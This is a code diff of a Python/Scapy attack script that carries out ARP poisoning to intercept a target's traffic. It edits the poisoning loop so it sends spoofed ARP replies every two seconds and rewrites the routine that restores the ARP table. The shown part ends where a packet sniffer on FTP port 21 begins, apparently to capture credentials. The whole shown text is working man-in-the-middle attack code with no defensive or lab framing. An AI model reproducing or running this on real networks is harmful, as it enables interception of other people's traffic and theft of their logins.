@@ -11,21 +11,24 @@ def arp_poison(victim_ip, victim_mac, spoof_ip, attacker_mac):
     poison_pkt = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip, hwsrc=attacker_mac)
     send(poison_pkt, verbose=False)
 
-def poison_loop(src_ip, src_mac, target_ip, target_mac, attacker_mac):
+def poison_loop(ip_src, mac_src, ip_target, mac_target, attacker_mac):
     try:
         print("[*] Starting ARP poisoning loop...")
         while True:
-            # Spoof each end to believe you are the other
-            arp_poison(target_ip, target_mac, src_ip, attacker_mac)
-            arp_poison(src_ip, src_mac, target_ip, attacker_mac)
+            # Trick the target into thinking IP-src is at attacker_mac
+            poison_pkt = ARP(op=2, pdst=ip_target, hwdst=mac_target,
+                             psrc=ip_src, hwsrc=attacker_mac)
+            send(poison_pkt, verbose=False)
             time.sleep(2)
     except KeyboardInterrupt:
         print("[!] CTRL+C detected. Restoring ARP tables...")
-        restore_arp(src_ip, src_mac, target_ip, target_mac)
+        restore_arp(ip_src, mac_src, ip_target, mac_target)
 
-def restore_arp(ip1, mac1, ip2, mac2):
-    send(ARP(op=2, pdst=ip1, hwdst=mac1, psrc=ip2, hwsrc=mac2), count=5, verbose=False)
-    send(ARP(op=2, pdst=ip2, hwdst=mac2, psrc=ip1, hwsrc=mac1), count=5, verbose=False)
+def restore_arp(ip_src, mac_src, ip_target, mac_target):
+    print("[*] Restoring ARP table of the target...")
+    # Send real mapping
+    send(ARP(op=2, pdst=ip_target, hwdst=mac_target,
+             psrc=ip_src, hwsrc=mac_src), count=5, verbose=False)
 
 def sniff_ftp():
     print("[*] Starting packet sniffer (port 21)...")
